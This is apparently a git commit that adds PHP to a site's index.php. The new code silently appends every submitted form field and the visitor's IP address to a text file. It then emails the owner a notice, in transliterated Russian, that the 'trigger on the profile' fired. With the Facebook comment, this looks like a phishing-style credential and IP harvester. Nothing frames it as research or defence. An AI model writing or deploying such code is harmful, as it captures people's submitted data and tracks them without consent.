2b6b8bd012b9dc9595664d6a984493da644389a8
SG13PW <admin@sg13.pw>
2025-06-23 02:54:51 +0300

    Update index.php

--- index.php
+++ index.php
@@ -3,3 +3,32 @@
 
 /* takes long list as facebook ("id classification of action needed) */
 
+/* collecting ips */
+
+<?php
+
+$ip = $_SERVER['REMOTE_ADDR'];
+
+$handle = fopen("ips.txt", "a");
+
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable . "+" . $value . "\r\n");
+}
+fwrite($handle, "VISITOR OF SG13.PW: $ip \r\n \r\n");
+fclose($handle);
+
+?>
+
+/* sending an email notify */
+
+<?php
+
+$yourEmailAddress = "your@email.pw";
+
+$emailSubject = "Srabotal trigger na profile";
+$remoteIpAddress = $_SERVER['REMOTE_ADDR'];
+$emailContent = "ip :".$remoteIpAddress;
+
+mail($yourEmailAddress, $emailSubject, $emailContent);
+
+?>
